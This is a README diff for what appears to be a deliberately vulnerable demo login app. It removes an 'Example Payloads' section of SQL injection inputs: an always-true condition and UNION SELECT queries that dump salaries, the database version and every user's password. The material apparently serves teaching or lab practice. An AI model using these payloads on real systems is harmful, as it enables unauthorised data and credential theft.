@@ -20,21 +20,3 @@ Run the following:
 Open web browser and visit:
 
 - `localhost:8080`
-
-## Example Payloads
-
-1. Normal login to get users salary:
-    - `username`: `james_kirk`
-    - `password`: `kobayashi_maru`
-
-2. Dump username and salary of all users:
-    - `username`: `' OR 1=1#`
-    - `password`: `anythingyouwant`
-
-3. Dump MySQL version:
-    - `username`: `' UNION SELECT null,@@version#`
-    - `password`: `anythingyouwant`
-
-4. Dump all users passwords:
-    - `username`: `' UNION SELECT username,password FROM users#`
-    - `password`: `anythingyouwant`
